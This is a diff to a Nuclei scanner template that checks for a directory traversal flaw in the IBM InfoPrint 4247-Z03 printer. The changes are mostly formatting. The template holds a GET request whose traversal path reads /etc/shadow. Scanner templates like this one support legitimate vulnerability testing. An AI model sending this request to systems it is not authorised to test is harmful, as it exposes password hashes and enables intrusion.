@@ -1,10 +1,11 @@
-id: IBM InfoPrint Directory Traversal
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: IBM-InfoPrint-Directory-Traversal
 info:
   name: IBM InfoPrint 4247-Z03 Impact Matrix Printer - Directory Traversal
   author: Harsh Bothra
-  severity: Medium
+  severity: medium
 # source:- https://www.exploit-db.com/exploits/47835
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/./../../../../../../../../../../etc/shadow'
